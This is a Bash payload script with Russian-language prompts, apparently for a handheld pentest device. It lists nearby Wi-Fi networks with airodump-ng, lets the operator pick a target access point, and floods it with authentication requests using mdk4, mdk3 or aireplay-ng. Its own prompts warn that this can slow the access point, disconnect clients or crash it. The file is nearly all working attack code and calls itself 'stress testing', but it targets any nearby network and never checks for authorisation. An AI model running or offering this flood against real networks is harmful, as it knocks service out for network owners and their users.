#!/bin/bash
# Название: Аутентификационный флуд
# Автор: bad-antics
# Описание: Флуд аутентификации для стресс-тестирования точек доступа
# Категория: nullsec/attack

# Автоопределение правильного беспроводного интерфейса (экспортирует $IFACE).
# В случае отсутствия подходящего интерфейса показывает диалог с ошибкой.
. /root/payloads/library/nullsec-iface.sh 2>/dev/null || . "$(dirname "$0")/../../../lib/nullsec-iface.sh"
nullsec_require_iface || exit 1

PROMPT "АУТЕНТИФИКАЦИОННЫЙ ФЛУД

Флуд целевой точки доступа
запросами аутентификации.

Может вызвать:
- Замедление работы ТД
- Отключение клиентов
- Сбой/перезагрузку

Нажмите ОК для настройки."

PROMPT "ВЫБОР ЦЕЛИ:

1. Сканировать и выбрать
2. Ввести BSSID вручную

Введите вариант далее."

MODE=$(NUMBER_PICKER "Режим (1-2):" 1)

if [ "$MODE" -eq 1 ]; then
    SPINNER_START "Сканирование..."
    timeout 10 airodump-ng $IFACE --write-interval 1 -w /tmp/authscan --output-format csv 2>/dev/null
    SPINNER_STOP
    
    NET_COUNT=$(grep -c "WPA\|WEP\|OPN" /tmp/authscan*.csv 2>/dev/null || echo 0)
    PROMPT "Найдено сетей: $NET_COUNT"
    
    TARGET_NUM=$(NUMBER_PICKER "Цель №:" 1)
    
    TARGET_LINE=$(grep "WPA\|WEP\|OPN" /tmp/authscan*.csv 2>/dev/null | sed -n "${TARGET_NUM}p")
    BSSID=$(echo "$TARGET_LINE" | cut -d',' -f1 | tr -d ' ')
    CHANNEL=$(echo "$TARGET_LINE" | cut -d',' -f4 | tr -d ' ')
    SSID=$(echo "$TARGET_LINE" | cut -d',' -f14 | tr -d ' ')
else
    BSSID=$(MAC_PICKER "Целевой BSSID:")
    CHANNEL=$(NUMBER_PICKER "Канал:" 6)
    SSID="цель"
fi

DURATION=$(NUMBER_PICKER "Длительность (сек):" 30)
case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) DURATION=30 ;; esac

resp=$(CONFIRMATION_DIALOG "ЗАПУСТИТЬ ФЛУД?

Цель: $SSID
BSSID: $BSSID
Длительность: ${DURATION} с

Нажмите ОК для атаки.")
[ "$resp" != "$DUCKYSCRIPT_USER_CONFIRMED" ] && exit 0

iwconfig $IFACE channel $CHANNEL

LOG "Флуд $SSID..."

if command -v mdk4 >/dev/null 2>&1; then
    timeout $DURATION mdk4 $IFACE a -a "$BSSID" &
elif command -v mdk3 >/dev/null 2>&1; then
    timeout $DURATION mdk3 $IFACE a -a "$BSSID" &
else
    # Запасной вариант с поддельной аутентификацией
    timeout $DURATION aireplay-ng -1 0 -e "$SSID" -a "$BSSID" -h $(cat /sys/class/net/$IFACE/address) $IFACE &
fi

FLOOD_PID=$!

PROMPT "АУТЕНТИФИКАЦИОННЫЙ ФЛУД АКТИВЕН

Цель: $SSID

Нажмите ОК для ОСТАНОВКИ."

kill $FLOOD_PID 2>/dev/null
killall mdk4 mdk3 aireplay-ng 2>/dev/null

PROMPT "ФЛУД ОСТАНОВЛЕН

Цель: $SSID
Нажмите ОК для выхода."